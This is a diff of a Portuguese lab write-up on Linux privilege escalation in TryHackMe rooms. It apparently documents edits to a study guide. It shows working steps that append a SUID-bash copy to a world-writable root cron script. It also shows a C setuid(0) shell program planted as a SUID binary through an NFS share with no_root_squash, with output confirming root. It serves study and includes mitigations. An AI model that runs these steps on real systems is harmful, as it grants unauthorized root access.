 -rwxrwxrwx 1 root root ... /usr/local/bin/cleanup.sh
 ~~~
 
-Conteúdo original:
+O script fazia limpeza de arquivos antigos:
 
 ~~~bash
 #!/bin/bash
@@ -571,57 +567,40 @@ find /var/tmp -type f -mtime +7 -delete
 echo "[cleanup] done at $(date)"
 ~~~
 
-A permissão <code>777</code> permite leitura, escrita e execução a todos. É uma configuração insegura para um script executado por root.
+A permissão <code>777</code> significava que qualquer usuário poderia modificar o script. Já o <code>namei -l</code> é útil para ver as permissões de cada componente do caminho.
 
-O comando <code>namei -l</code> também examina as permissões de **cada diretório no caminho**, e não apenas do script.
+#### Acrescentar o teste ao script
 
-### 7.3 Demonstração do impacto
-
-Primeiro, uma cópia do arquivo original:
+Primeiro guardei o original:
 
 ~~~bash
 cp /usr/local/bin/cleanup.sh ~/cleanup.sh.bak
 ~~~
 
-No laboratório, adicionamos ao final do script uma instrução que cria uma cópia SUID do Bash:
+Depois adicionei o comando de demonstração sem apagar as instruções de limpeza:
 
 ~~~bash
 printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /usr/local/bin/cleanup.sh
 ~~~
 
-Quando o Cron executa a tarefa como root, essa cópia é criada com os privilégios do usuário que executou a tarefa. Após a próxima execução:
+O <code>&gt;&gt;</code> acrescenta uma linha no final do script. Na próxima execução da tarefa, o processo root cria uma cópia do Bash e configura seu SUID.
+
+Após a execução agendada, confira:
 
 ~~~bash
 ls -l /tmp/rootbash
 ~~~
 
-A condição esperada é um arquivo **pertencente ao root e com SUID**, por exemplo:
+Se o arquivo for criado pelo root com SUID, as permissões devem começar com <code>-rws</code>.
 
-~~~text
--rwsr-xr-x 1 root root ... /tmp/rootbash
-~~~
-
-No cenário do laboratório, o teste seria:
+Para testar no laboratório:
 
 ~~~bash
 /tmp/rootbash -p
 id
 ~~~
 
-A opção <code>-p</code> instrui o Bash a preservar privilégios efetivos. **Na conversa, a configuração vulnerável foi confirmada, mas não há registro de saída final <code>uid=0</code> dessa VM.**
-
-### 7.4 Limpeza do laboratório
-
-Após testar, restaure o script e elimine o executável de demonstração, com permissão adequada:
-
-~~~bash
-cat /home/john/cleanup.sh.bak > /usr/local/bin/cleanup.sh
-rm -f /tmp/rootbash
-~~~
-
-O operador <code>&gt;&gt;</code> acrescenta conteúdo; <code>&gt;</code> substitui o conteúdo do arquivo. Essa diferença é essencial.
-
-**Mitigação:** scripts executados pelo root devem pertencer a root e não ser graváveis por usuários comuns. Revisar tanto <code>/etc/crontab</code> quanto <code>/etc/cron.d/</code>.
+A causa da vulnerabilidade é simples: **um arquivo modificável por usuários comuns não deve ser executado automaticamente como root**.
 
 [↑ Voltar ao índice](#topo)
 
@@ -629,55 +608,67 @@ O operador <code>&gt;&gt;</code> acrescenta conteúdo; <code>&gt;</code> substit
 
 <a id="nfs"></a>
 
-## 8. NFS: no_root_squash e escalada entre duas VMs
+### Privilege Escalation: NFS e no_root_squash
 
-Ao contrário dos exercícios anteriores, esta etapa exigiu duas máquinas:
+O **NFS (Network File System)** permite compartilhar diretórios pela rede, como se uma pasta de outro computador estivesse conectada ao nosso Linux.
 
-| Máquina | IP de exemplo da sessão | Papel |
-|---|---|---|
-| AttackBox | <code>10.66.106.92</code> | Montar o NFS e criar o executável |
-| nfs-box | <code>10.66.133.77</code> | Executar o arquivo compartilhado |
+É usado normalmente para compartilhar arquivos entre servidores, máquinas de trabalho, ambientes de desenvolvimento e sistemas de backup.
 
-Os IPs mudaram após o reinício das VMs. **Não reutilize o IP da AttackBox como se fosse o do alvo.**
+O comando **mount** conecta um sistema de arquivos a um diretório local. Por exemplo, podemos montar um compartilhamento remoto em <code>/mnt/nfs-thm</code>: a partir daí, os arquivos gravados nesse diretório aparecem também no compartilhamento do servidor.
 
-### 8.1 Identificar a configuração vulnerável
+Por isso, nesse exercício **não precisamos de Netcat nem Metasploit para enviar o executável**. O próprio NFS já faz essa troca de arquivos.
 
-No alvo:
+#### Identificar o compartilhamento vulnerável
+
+Na VM alvo <code>nfs-box</code>:
 
 ~~~bash
 cat /etc/exports
 ~~~
 
-Resultado:
-
 ~~~text
 /opt/nfs *(rw,sync,no_root_squash,no_subtree_check)
 ~~~
 
-E a enumeração remota:
+O arquivo <code>/etc/exports</code> define quais diretórios o servidor oferece pela rede e sob quais condições.
+
+| Opção | Significado |
+|---|---|
+| <code>rw</code> | Permite leitura e escrita |
+| <code>sync</code> | Confirma operações conforme a política síncrona de gravação |
+| <code>no_root_squash</code> | Preserva a identidade UID 0 do root remoto |
+| <code>no_subtree_check</code> | Dispensa verificações de subárvore |
+| <code>*</code> | Aceita qualquer cliente segundo essa regra de exportação |
+
+O detalhe perigoso é **no_root_squash**. Normalmente, o NFS pode mapear o root de um cliente para uma conta sem privilégios no servidor (*root_squash*). Aqui, esse mapeamento estava desativado.
+
+#### Conferir os compartilhamentos pela AttackBox
+
+Na sessão da room, as máquinas estavam assim:
+
+| Máquina | IP usado | Função |
+|---|---|---|
+| AttackBox | <code>10.66.106.92</code> | Criar e colocar o arquivo no compartilhamento |
+| nfs-box | <code>10.66.133.77</code> | Executar o arquivo |
+
+Esses IPs são apenas exemplos da sessão e podem mudar.
+
+Na AttackBox:
 
 ~~~bash
 showmount -e 10.66.133.77
 ~~~
+
+Resultado:
 
 ~~~text
 Export list for 10.66.133.77:
 /opt/nfs *
 ~~~
 
-Significado:
+#### Montar o compartilhamento
 
-- <code>rw</code>: compartilhamento exportado para leitura e escrita.
-- <code>sync</code>: política de confirmação sincronizada das operações.
-- <code>no_root_squash</code>: impede o mapeamento padrão do UID 0 remoto para um usuário anônimo.
-- <code>no_subtree_check</code>: desativa verificações de subárvore.
-- <code>*</code>: permite clientes conforme a regra de exportação, sem restringir por host nessa entrada.
-
-**Ponto central:** o root da AttackBox pode criar um arquivo no compartilhamento preservando sua identidade de proprietário root no servidor NFS.
-
-### 8.2 AttackBox: montar o compartilhamento
-
-No terminal root da **AttackBox**:
+Na **AttackBox**, com root:
 
 ~~~bash
 mkdir -p /mnt/nfs-thm
@@ -685,15 +676,30 @@ mount -t nfs -o rw 10.66.133.77:/opt/nfs /mnt/nfs-thm
 mount | grep nfs-thm
 ~~~
 
-O resultado confirmado foi um mount NFSv4 do alvo para <code>/mnt/nfs-thm</code>.
+- <code>mkdir -p</code> cria o diretório local, se necessário.
+- <code>-t nfs</code> informa o tipo de sistema de arquivos.
+- <code>-o rw</code> solicita montagem com leitura e escrita.
+- <code>IP:/opt/nfs</code> é o diretório compartilhado do alvo.
+- <code>/mnt/nfs-thm</code> é onde acessamos esse diretório na AttackBox.
 
-A primeira tentativa de montagem usou, por engano, <code>10.66.106.92</code> (IP da própria AttackBox). A montagem correta usa **10.66.133.77**, o IP do servidor NFS.
+A partir desse ponto, o conteúdo colocado em <code>/mnt/nfs-thm</code> aparece na VM alvo em <code>/opt/nfs</code>.
 
-Não precisamos de Netcat nem Metasploit: **o NFS já oferece o canal de compartilhamento do arquivo**.
+#### Código para criar um executável privilegiado
 
-### 8.3 Criar o código C sem abrir editor
+O programa abaixo tenta assumir UID/GID 0 e abrir um Bash. Ele depende de ser executado por meio de um arquivo pertencente ao root com SUID.
 
-Na AttackBox:
+~~~c
+#include <unistd.h>
+
+int main(void) {
+    setgid(0);
+    setuid(0);
+    execl("/bin/bash", "bash", "-p", (char *)NULL);
+    return 1;
+}
+~~~
+
+Podemos criar o arquivo diretamente no terminal:
 
 ~~~bash
 cat > /mnt/nfs-thm/nfs.c <<'EOF'
@@ -708,20 +714,11 @@ int main(void) {
 EOF
 ~~~
 
-- <code>setgid(0)</code>: define o GID como root.
-- <code>setuid(0)</code>: define o UID como root.
-- <code>execl()</code>: substitui o processo pelo Bash.
-- <code>bash -p</code>: mantém privilégios efetivos quando aplicável.
+**Dica:** nesse formato, o <code>cat</code> recebe as linhas até <code>EOF</code> e o <code>&gt;</code> grava o arquivo. Não é preciso abrir Nano ou Vim. Para adicionar conteúdo ao final de um arquivo existente, use <code>&gt;&gt;</code>.
 
-### 8.4 Compilar localmente e copiar para o compartilhamento
+#### Compilar e enviar pelo próprio NFS
 
-Uma primeira tentativa compilou diretamente sobre o compartilhamento e o alvo apresentou:
-
-~~~text
--bash: /opt/nfs/nfs: Text file busy
-~~~
-
-Isso pode ocorrer quando o arquivo executável ainda está aberto para escrita. O procedimento que resolveu a preparação foi **compilar fora do diretório montado** e copiar o arquivo completo depois:
+É mais simples compilar localmente na AttackBox e depois copiar o binário pronto para a pasta montada:
 
 ~~~bash
 gcc /mnt/nfs-thm/nfs.c -o /root/nfs2 -static
@@ -732,38 +729,19 @@ sync
 ls -l /mnt/nfs-thm/nfs2
 ~~~
 
-Resultado esperado:
+O <code>-static</code> pede compilação com ligação estática. O <code>chown</code> define a propriedade como root, o <code>chmod 4755</code> ativa SUID e o <code>sync</code> solicita a gravação dos dados pendentes.
+
+O resultado esperado é:
 
 ~~~text
 -rwsr-xr-x 1 root root ... /mnt/nfs-thm/nfs2
 ~~~
 
-### 8.5 O segundo erro: chmod no arquivo errado
+**Lembrete:** confirme as permissões do mesmo arquivo que será executado. O <code>s</code> precisa aparecer no executável <code>nfs2</code>, não em outro arquivo.
 
-O executável <code>nfs2</code> havia sido compilado e copiado corretamente, mas a permissão SUID foi aplicada por engano ao arquivo antigo:
+#### Executar na nfs-box
 
-~~~bash
-chmod 4755 /mnt/nfs-thm/nfs
-~~~
-
-O alvo, portanto, mostrava:
-
-~~~text
--rwxr-xr-x 1 root root ... /opt/nfs/nfs2
-~~~
-
-Sem o <code>s</code>, o binário não elevava privilégios. A correção foi:
-
-~~~bash
-chmod 4755 /mnt/nfs-thm/nfs2
-sync
-~~~
-
-**Sempre confira o caminho completo e a permissão do mesmo arquivo que será executado.**
-
-### 8.6 nfs-box: executar e confirmar root
-
-No alvo, com o usuário <code>john</code>:
+Voltando ao terminal <code>john@nfs-box</code>:
 
 ~~~bash
 ls -l /opt/nfs/nfs2
@@ -772,7 +750,7 @@ id
 whoami
 ~~~
 
-Resultado real da sessão:
+A VM retornou:
 
 ~~~text
 -rwsr-xr-x 1 root root 785768 ... /opt/nfs/nfs2
@@ -780,28 +758,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(john)
 root
 ~~~
 
-**Exploração confirmada.** O grupo suplementar <code>1001(john)</code> ainda aparecer na saída não altera o fato de que UID e GID já eram 0.
-
-Se o binário não elevar, verifique a propriedade, o SUID, a configuração <code>no_root_squash</code>, a permissão de execução e opções de montagem como <code>nosuid</code>.
-
-### 8.7 Localizar a flag e limpar
-
-Com os privilégios obtidos:
-
-~~~bash
-find /root -type f -iname '*flag*' 2>/dev/null
-~~~
-
-Leia o caminho encontrado com <code>cat</code>. O conteúdo da flag desta VM **não foi registrado na conversa**, então não será inventado aqui.
-
-Ao concluir o laboratório, remova os artefatos criados e desmonte o compartilhamento na AttackBox, conforme as permissões disponíveis:
-
-~~~bash
-rm -f /mnt/nfs-thm/nfs2 /mnt/nfs-thm/nfs.c
-umount /mnt/nfs-thm
-~~~
-
-**Mitigação:** evitar <code>no_root_squash</code> em compartilhamentos acessíveis a clientes não confiáveis, limitar clientes autorizados, controlar permissões e empregar opções adequadas de montagem e exportação.
+**Root confirmado.** O arquivo criado pela AttackBox apareceu no servidor com proprietário root e SUID, permitindo que o usuário <code>john</code> executasse o programa com privilégios administrativos.
 
 [↑ Voltar ao índice](#topo)
 
@@ -809,26 +766,34 @@ umount /mnt/nfs-thm
 
 <a id="duvidas"></a>
 
-## 9. Dúvidas e erros que apareceram durante os laboratórios
+## Erros comuns e dúvidas
 
-| Sintoma | Causa ou diagnóstico |
+Durante os exercícios, alguns detalhes pequenos fizeram bastante diferença. Reuni aqui os que valem lembrar em outros laboratórios.
+
+| Situação | O que aconteceu / como resolver |
 |---|---|
-| <code>sudo find</code> pede senha ou é negado | O <code>sudo -l</code> não autorizava <code>find</code>; apenas Nano e Apache2 |
-| Apache mostra <code>root:*</code> | O Apache vazou a linha como erro de configuração, mas <code>*</code> não é hash recuperável |
-| GCC avisa <code>implicit declaration of setuid</code> | Faltou incluir <code>&lt;unistd.h&gt;</code> |
-| <code>su hacker</code> diz que o usuário não existe | Gerar um hash não cria a conta; é preciso uma entrada válida em <code>/etc/passwd</code> |
-| <code>su THM</code> não funciona | <code>THM</code> é o salt usado no exemplo, não o usuário |
-| Não aparece um binário suspeito em <code>/usr/bin</code> | Ampliar a busca para todo o sistema, inclusive <code>/opt</code> |
-| Criou <code>/tmp/thm</code>, mas o PATH Hijacking não funcionou | O programa real da VM procurava <code>whoami</code>, não <code>thm</code> |
-| <code>whoami</code> não imprime o usuário após a exploração de PATH | O próprio comando foi sequestrado; executar <code>/usr/bin/whoami</code> |
-| <code>./vim: No such file or directory</code> | <code>./</code> indica diretório atual; a capability encontrada era do Python |
-| Cron não produz efeito imediato | Tarefa configurada para executar no próximo minuto; confirmar antes as permissões e o agendamento |
-| Montagem NFS demora ou falha | Verificar se foi usado o **IP do alvo**, não o da AttackBox |
-| <code>Text file busy</code> | Executável possivelmente aberto para escrita; compilar localmente e copiar depois |
-| Binário NFS mostra <code>-rwxr-xr-x</code> | SUID não aplicado ao arquivo efetivamente executado |
-| Binário mostra <code>-rwsr-xr-x</code> mas não eleva | Verificar proprietário root, <code>nosuid</code>, restrições do programa e demais condições |
+| <code>sudo find</code> pediu senha e foi negado | Copiei o comando de um exemplo, mas o <code>sudo -l</code> autorizava apenas Nano e Apache2. Primeiro confira **o que realmente está permitido**. |
+| GCC mostrou <code>implicit declaration of setuid</code> | Faltava <code>#include &lt;unistd.h&gt;</code>, onde são declaradas <code>setuid()</code> e <code>setgid()</code>. |
+| <code>su hacker</code> dizia que o usuário não existia | Eu havia gerado apenas o hash; ainda precisava salvar a entrada completa no <code>/etc/passwd</code>. |
+| <code>su THM</code> não funcionou | <code>THM</code> era o salt do hash, não o nome da conta. |
+| A busca SUID não mostrou nada interessante | A busca limitada a <code>/usr/bin</code> não encontrava <code>/opt/path/mywhoami</code>. Amplie para <code>/</code> quando necessário. |
+| Criei <code>/tmp/thm</code>, mas não era usado | O exemplo didático procurava <code>thm</code>; o programa real procurava <code>whoami</code>. |
+| <code>whoami</code> deixou de imprimir o usuário | O comando havia sido substituído no PATH. Use <code>/usr/bin/whoami</code> para chamar o executável original. |
+| <code>./vim: No such file or directory</code> | <code>./</code> procura no diretório atual. Além disso, a capability encontrada naquela VM estava no Python, não no Vim. |
+| NFS não montava | Inicialmente usei o IP da AttackBox em vez do IP da nfs-box. O IP após <code>mount</code> deve ser o do servidor NFS. |
+| <code>Text file busy</code> ao executar o binário NFS | O arquivo ainda podia estar aberto para escrita. Compilei fora do NFS e depois copiei o binário pronto. |
+| <code>nfs2</code> rodava, mas continuava como <code>john</code> | O <code>chmod 4755</code> havia sido aplicado ao antigo <code>nfs</code>, não ao <code>nfs2</code>. Conferir <code>ls -l</code> mostrou a diferença. |
+| SUID está presente, mas o programa não eleva | Verifique proprietário, comportamento do programa, sistema de arquivos e restrições como <code>nosuid</code>. SUID sozinho não garante exploração. |
 
-Um <code>id</code> retornando <code>uid=0</code> é uma evidência muito mais forte da escalação do que apenas o prompt começar com <code>root@</code>.
+Se precisar examinar arquivos de contas sem modificá-los, estes dois comandos também ajudam:
+
+~~~bash
+# Contas com UID 0
+awk -F: '$3 == 0 {print $1, $3, $4}' /etc/passwd
+
+# Entradas sem os sete campos esperados
+awk -F: 'NF != 7 {print NR, $0}' /etc/passwd
+~~~
 
 [↑ Voltar ao índice](#topo)
 
@@ -836,51 +801,50 @@ Um <code>id</code> retornando <code>uid=0</code> é uma evidência muito mais fo
 
 <a id="comandos"></a>
 
-## 10. Tabela de referência: comandos, opções e operadores
+## Tabela de comandos e operadores
 
-| Comando/opção | O que faz | Exemplo |
+| Comando / operador | Para que serve | Exemplo |
 |---|---|---|
-| <code>id</code> | Exibe UID, GID e grupos | <code>id</code> |
+| <code>id</code> | UID, GID e grupos | <code>id</code> |
 | <code>whoami</code> | Nome associado ao UID efetivo | <code>/usr/bin/whoami</code> |
-| <code>sudo -l</code> | Lista permissões sudo | <code>sudo -l</code> |
-| <code>ls -l</code> | Permissões e propriedade | <code>ls -l /usr/bin/vim.basic</code> |
-| <code>find -type f</code> | Somente arquivos regulares | <code>find /opt -type f</code> |
-| <code>find -type d</code> | Somente diretórios | <code>find /tmp -type d</code> |
-| <code>-user root</code> | Restringe proprietário | <code>find / -user root</code> |
-| <code>-perm -4000</code> | Verifica bit SUID | <code>find / -perm -4000</code> |
-| <code>-perm -2000</code> | Verifica bit SGID | <code>find / -perm -2000</code> |
-| <code>-writable</code> | Caminho gravável pelo usuário | <code>find /opt -writable</code> |
-| <code>-printf '%p\n'</code> | Imprime somente caminhos, um por linha | <code>find /opt -printf '%p\n'</code> |
-| <code>2&gt;/dev/null</code> | Oculta a saída de erro | <code>find / 2&gt;/dev/null</code> |
-| <code>&#124;</code> | Encaminha stdout para outro comando | <code>find ... &#124; grep ...</code> |
-| <code>grep -v</code> | Exclui linhas correspondentes | <code>grep -v '^/snap/'</code> |
-| <code>sort -u</code> | Ordena e remove duplicações | <code>sort -u</code> |
-| <code>&gt;</code> | Cria/sobrescreve arquivo | <code>printf 'ok\n' &gt; /tmp/teste</code> |
-| <code>&gt;&gt;</code> | Acrescenta ao final | <code>printf 'ok\n' &gt;&gt; /tmp/teste</code> |
-| <code>printf</code> | Gera conteúdo formatado | <code>printf 'linha\n'</code> |
-| <code>chmod 755</code> | Permissão rwx/rx/rx | <code>chmod 755 script.sh</code> |
-| <code>chmod 4755</code> | Ativa SUID em arquivo executável | <code>chmod 4755 binario</code> |
-| <code>chown</code> | Altera propriedade | <code>chown root:root binario</code> |
-| <code>./arquivo</code> | Executa arquivo no diretório atual | <code>./program</code> |
-| <code>strings</code> | Extrai texto legível de binário | <code>strings ./program</code> |
-| <code>getcap -r</code> | Busca capabilities recursivamente | <code>getcap -r /</code> |
-| <code>namei -l</code> | Permissões de componentes do caminho | <code>namei -l /opt/script.sh</code> |
-| <code>showmount -e</code> | Lista exports NFS | <code>showmount -e IP</code> |
-| <code>mount -t nfs</code> | Monta compartilhamento NFS | <code>mount -t nfs IP:/pasta /mnt/pasta</code> |
+| <code>sudo -l</code> | Comandos autorizados pelo sudo | <code>sudo -l</code> |
+| <code>uname -a</code> | Informações do sistema e kernel | <code>uname -a</code> |
+| <code>ip -br addr</code> | Resumo dos IPs e interfaces | <code>ip -br addr</code> |
+| <code>ss -tuln</code> | Portas TCP/UDP em escuta | <code>ss -tuln</code> |
+| <code>find -type f</code> | Apenas arquivos regulares | <code>find /opt -type f</code> |
+| <code>find -type d</code> | Apenas diretórios | <code>find /tmp -type d</code> |
+| <code>-user root</code> | Arquivos pertencentes ao root | <code>find /opt -user root</code> |
+| <code>-perm -4000</code> | Arquivos com bit SUID | <code>find / -perm -4000</code> |
+| <code>-perm -2000</code> | Arquivos com bit SGID | <code>find / -perm -2000</code> |
+| <code>-writable</code> | Arquivos/diretórios graváveis | <code>find /opt -writable</code> |
+| <code>-printf '%p\n'</code> | Imprime um caminho por linha | <code>find /opt -printf '%p\n'</code> |
+| <code>2&gt;/dev/null</code> | Oculta mensagens de erro | <code>find / 2&gt;/dev/null</code> |
+| <code>&#124;</code> | Envia saída para o próximo comando | <code>ls &#124; grep log</code> |
+| <code>grep -v</code> | Remove linhas correspondentes | <code>grep -v '^/snap/'</code> |
+| <code>sort -u</code> | Ordena e remove duplicados | <code>sort -u</code> |
+| <code>&gt;</code> | Cria ou substitui conteúdo | <code>printf 'a\n' &gt; teste</code> |
+| <code>&gt;&gt;</code> | Acrescenta conteúdo | <code>printf 'b\n' &gt;&gt; teste</code> |
+| <code>printf</code> | Escreve texto formatado | <code>printf 'linha\n'</code> |
+| <code>chmod 755</code> | Permissões rwx/rx/rx | <code>chmod 755 script.sh</code> |
+| <code>chmod 4755</code> | Ativa SUID e permissões 755 | <code>chmod 4755 binario</code> |
+| <code>chown</code> | Muda proprietário e grupo | <code>chown root:root binario</code> |
+| <code>./arquivo</code> | Executa arquivo do diretório atual | <code>./program</code> |
+| <code>strings</code> | Extrai textos de um binário | <code>strings ./program</code> |
+| <code>getcap -r</code> | Procura capabilities recursivamente | <code>getcap -r /</code> |
+| <code>namei -l</code> | Examina permissões em cada nível do caminho | <code>namei -l /opt/script.sh</code> |
+| <code>showmount -e</code> | Lista compartilhamentos NFS exportados | <code>showmount -e IP</code> |
+| <code>mount -t nfs</code> | Monta diretório NFS remotamente | <code>mount -t nfs IP:/pasta /mnt/pasta</code> |
 | <code>sync</code> | Solicita gravação de dados pendentes | <code>sync</code> |
 
-### Como interpretar permissões?
+### Entendendo permissões rapidamente
 
 ~~~text
--rwsr-xr-x
- │││ │ │
- │││ │ └── outros: leitura e execução
- │││ └──── grupo: leitura e execução
- │└┴─────── dono: leitura, escrita e execução com SUID
- └───────── arquivo regular
+-rwsr-xr-x  ← SUID ativo (s)
+-rwxr-xr-x  ← executável comum (x)
+-rwxrwxrwx  ← qualquer usuário pode ler, escrever e executar
 ~~~
 
-<code>chmod 4755</code> combina o dígito especial <code>4</code> (SUID) com <code>755</code> (permissões usuais). Não confunda com <code>chmod 777</code>, que deixa o arquivo gravável por qualquer usuário, mas **não ativa SUID**.
+O <code>chmod 4755</code> usa o primeiro dígito <code>4</code> para ativar SUID, enquanto <code>755</code> define permissões normais. Já <code>777</code> dá escrita a todos, **mas não ativa SUID**.
 
 [↑ Voltar ao índice](#topo)
 
@@ -888,42 +852,39 @@ Um <code>id</code> retornando <code>uid=0</code> é uma evidência muito mais fo
 
 <a id="glossario"></a>
 
-## 11. Glossário: siglas e conceitos básicos
+## Glossário de siglas e conceitos
 
-| Termo | Explicação |
+| Termo | O que é e para que serve |
 |---|---|
-| <a id="conceito-uid"></a>**UID** (*User ID*) | Identificador numérico do usuário; UID 0 é a identidade root |
-| **EUID** (*Effective UID*) | Identidade efetiva usada nas verificações de permissão do processo |
-| **GID** (*Group ID*) | Identificador numérico do grupo principal |
-| **EGID** (*Effective GID*) | Grupo efetivo utilizado em verificações de permissão |
-| <a id="conceito-suid"></a>**SUID** (*Set User ID*) | Bit que permite executar um binário com o UID efetivo do proprietário |
-| **SGID** (*Set Group ID*) | Bit relacionado ao grupo; seu comportamento depende de ser arquivo ou diretório |
-| <a id="conceito-sudo"></a>**sudo** (*superuser do*, uso consagrado) | Mecanismo que executa comandos autorizados sob outra identidade |
-| **sudoers** | Configuração que define regras do sudo |
-| <a id="conceito-ldpreload"></a>**LD_PRELOAD** | Variável para carregar bibliotecas antes de outras bibliotecas dinâmicas |
-| **.so** (*shared object*) | Biblioteca compartilhada no Linux |
-| **ELF** (*Executable and Linkable Format*) | Formato comum de executáveis e bibliotecas Linux |
-| **GCC** (*GNU Compiler Collection*) | Conjunto de compiladores |
-| **PIC** (*Position-Independent Code*) | Código que pode funcionar em diferentes endereços de memória |
-| **PATH** | Variável com diretórios usados para localizar comandos |
-| **PATH Hijacking** | Indução de um programa a executar um comando controlado por terceiro a partir do PATH |
-| <a id="conceito-capabilities"></a>**Linux Capabilities** | Privilégios de kernel separados em capacidades específicas |
-| **cap_setuid** | Capability para alterar a identidade de usuário do processo |
-| **effective/permitted** | Conjuntos que determinam quais capabilities estão disponíveis e podem ser usadas |
-| <a id="conceito-cron"></a>**Cron** | Serviço de tarefas executadas segundo um agendamento |
-| **Cron Job** | Comando ou script executado pelo Cron |
-| **NFS** (*Network File System*) | Sistema de arquivos compartilhado pela rede |
-| **Export** | Diretório disponibilizado a clientes NFS |
-| **root_squash** | Mapeamento do root remoto para uma identidade anônima no NFS |
-| **no_root_squash** | Desativa esse mapeamento para o root remoto |
-| **nosuid** | Opção de montagem que impede o efeito de SUID/SGID e certas capabilities de arquivo |
-| **Shell** | Interpretador de comandos, como Bash ou sh |
-| **Root** | Conta administrativa do Unix/Linux, geralmente com UID 0 |
-| **Hash** | Resultado de função criptográfica unidirecional usado, entre outros fins, na verificação de senhas |
-| **Salt** | Valor incorporado ao processo de hashing para evitar hashes idênticos em senhas iguais |
-| **GTFOBins** | Catálogo de comportamentos de binários Unix úteis para auditoria e abuso de permissões |
-| **ETXTBSY** (*Text file busy*) | Erro que pode surgir quando um executável está aberto para escrita |
-| **TryHackMe (THM)** | Plataforma de laboratórios de treinamento em segurança |
+| <a id="conceito-uid"></a>**UID** (*User ID*) | Número que identifica a conta Linux. O UID 0 identifica root. |
+| **EUID** (*Effective User ID*) | Identidade que o sistema considera nas verificações de permissão do processo. |
+| **GID** (*Group ID*) | Número que identifica o grupo principal. |
+| <a id="conceito-suid"></a>**SUID** (*Set User ID*) | Bit que permite executar um binário com o UID efetivo de seu proprietário. |
+| **SGID** (*Set Group ID*) | Bit associado à identidade de grupo; seu efeito depende do tipo de arquivo. |
+| **Sudo** | Ferramenta usada para executar comandos autorizados sob outra identidade. |
+| **sudoers** | Regras que dizem quem pode usar sudo, em quais programas e condições. |
+| <a id="conceito-ldpreload"></a>**LD_PRELOAD** | Variável que permite solicitar o carregamento antecipado de bibliotecas dinâmicas. |
+| **.so** (*Shared Object*) | Arquivo de biblioteca compartilhada no Linux. |
+| **GCC** (*GNU Compiler Collection*) | Ferramentas utilizadas para compilar código, como programas em C. |
+| **ELF** (*Executable and Linkable Format*) | Formato comum de binários e bibliotecas Linux. |
+| **PIC** (*Position-Independent Code*) | Código que funciona em diferentes endereços de memória. |
+| **PATH** | Variável com os diretórios pesquisados para encontrar comandos. |
+| **PATH Hijacking** | Manipulação da busca de comandos para executar outro programa com o mesmo nome. |
+| <a id="conceito-capabilities"></a>**Linux Capabilities** | Permissões específicas do kernel, sem necessariamente conceder todos os privilégios do root. |
+| **cap_setuid** | Capability que permite alterar o UID do processo. |
+| <a id="conceito-cron"></a>**Cron** | Agendador de tarefas do Linux. |
+| **Cron Job** | Tarefa executada automaticamente pelo Cron. |
+| <a id="conceito-nfs"></a>**NFS** (*Network File System*) | Serviço usado para acessar arquivos e diretórios compartilhados pela rede. |
+| **mount** | Comando que associa um sistema de arquivos a um diretório local. |
+| **Export** | Diretório disponibilizado por um servidor NFS. |
+| **root_squash** | Recurso NFS que mapeia o root remoto para uma identidade sem privilégios. |
+| **no_root_squash** | Desativa esse mapeamento e pode permitir que o root remoto preserve UID 0. |
+| **nosuid** | Opção de montagem que impede efeitos de SUID/SGID e certas capabilities de arquivos. |
+| **Shell** | Programa de interpretação de comandos, como Bash ou sh. |
+| **Hash** | Resultado de função unidirecional, usado também para verificar senhas. |
+| **Salt** | Valor incorporado ao hashing de senhas para evitar resultados idênticos para senhas iguais. |
+| **GTFOBins** | Catálogo de técnicas envolvendo binários Unix e permissões. |
+| **ETXTBSY** (*Text file busy*) | Erro que pode acontecer ao executar um arquivo aberto para escrita. |
 
 [↑ Voltar ao índice](#topo)
 
@@ -931,58 +892,49 @@ Um <code>id</code> retornando <code>uid=0</code> é uma evidência muito mais fo
 
 <a id="mitigacao"></a>
 
-## 12. Mitigação, fluxo mental e conclusão
+## Mitigação e conclusão
 
-### O fluxo que funcionou melhor
+Depois de passar por essas VMs, uma coisa ficou clara: **uma configuração pequena e aparentemente inofensiva pode ser suficiente para entregar privilégios de root**.
+
+| Técnica | Problema | Como evitar |
+|---|---|---|
+| Sudo e LD_PRELOAD | Permissões amplas e variáveis de ambiente perigosas | Restringir sudoers e revisar o ambiente preservado |
+| SUID | Programa privilegiado com funções perigosas | Remover SUID desnecessário e auditar binários |
+| PATH Hijacking | Busca de comandos em diretórios controláveis | Usar caminhos absolutos e PATH confiável |
+| Capabilities | Permissão perigosa em interpretador genérico | Revisar e remover capabilities excessivas |
+| Cron Jobs | Root executa script gravável por outros usuários | Corrigir proprietário, diretórios e permissões |
+| NFS | Compartilhamento gravável com no_root_squash | Habilitar root_squash e limitar os clientes autorizados |
+
+O caminho mental que funcionou melhor foi:
 
 ~~~text
-1. Identificar usuário e ambiente (id, sudo -l)
-           ↓
-2. Enumerar controles especiais (SUID, capabilities, cron, NFS)
-           ↓
-3. Encontrar configuração incomum
-           ↓
-4. Verificar permissões e comportamento real do programa
-           ↓
-5. Selecionar a técnica compatível com a VM
-           ↓
-6. Testar em ambiente autorizado
-           ↓
-7. Confirmar UID/EUID e recuperar evidências
-           ↓
-8. Remover artefatos e documentar mitigação
+Enumerar
+   ↓
+Encontrar algo incomum
+   ↓
+Verificar permissões e comportamento
+   ↓
+Entender a falha
+   ↓
+Testar a hipótese
+   ↓
+Confirmar privilégios
 ~~~
 
-### Comparação das seis técnicas
+Em laboratórios próprios, vale restaurar um snapshot após as práticas e remover montagens ou artefatos criados durante os testes. Em especial, não mantenha usuários UID 0 adicionais, cópias SUID de shells ou scripts agendados modificados.
 
-| Vetor | Falha fundamental | Correção prioritária |
-|---|---|---|
-| Sudo e LD_PRELOAD | Execução privilegiada permissiva e ambiente inseguro | Restringir sudoers e variáveis preservadas |
-| SUID | Binário privilegiado pode alterar arquivos ou executar funções perigosas | Remover SUID desnecessário |
-| PATH Hijacking | Programa privilegiado procura comandos em diretórios não confiáveis | Usar caminhos absolutos e PATH controlado |
-| Capabilities | Capability perigosa concedida a interpretador genérico | Revogar capabilities excessivas |
-| Cron Jobs | Root executa script gravável por outros usuários | Corrigir proprietário/permissões e auditar tarefas |
-| NFS | Export gravável com no_root_squash para clientes não confiáveis | Aplicar root_squash e restringir acesso |
+### Referências e ferramentas para continuar estudando
 
-### O que levei dos laboratórios
+- [GTFOBins](https://gtfobins.github.io/) — ótimo para verificar os usos de binários que encontramos durante a enumeração.
+- [GTFOBins no GitHub](https://github.com/GTFOBins/GTFOBins.github.io) — repositório do projeto.
